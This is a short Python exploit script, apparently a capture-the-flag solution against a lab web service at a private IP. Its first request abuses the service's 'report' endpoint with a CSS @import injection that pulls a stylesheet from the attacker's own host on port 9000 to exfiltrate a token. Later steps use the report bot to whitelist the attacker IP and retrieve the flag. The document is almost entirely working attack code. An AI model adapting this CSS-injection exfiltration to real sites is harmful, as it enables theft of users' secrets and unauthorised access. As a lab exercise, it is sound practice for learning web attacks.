import requests
import time
url = "http://172.26.0.2:1337/"
our_ip = '172.26.0.1'

#exfiltrate token
obj = {'url': 'http://localhost:1337/@import%20url(http:%2F%2F'+our_ip+':9000%2Fget.css%3Fi=1);div[lang=NewSpeak]/dashboard'}
print(obj)
r = requests.post(url + 'report', json=obj)
if r.status_code != 200:
    raise ValueError('could not report site :-(')

r.close()

# token = input('token: ')
time.sleep(5)

# whitelist our ip
# obj = {'address': our_ip, 'token':token}
obj = {'url': 'http://'+our_ip+':9000/'}
r = requests.post(url + 'report', json=obj)
if r.status_code == 200:
    print(r.json())
    r.close()
else:
    raise ValueError('could not whitelist IP')

time.sleep(1)

# get flag
r = requests.get(url + 'div[lang=NewSpeak]/dashboard')
if r.status_code == 200:
    print(r.text)
    r.close()
else:
    raise ValueError('could not get flag')
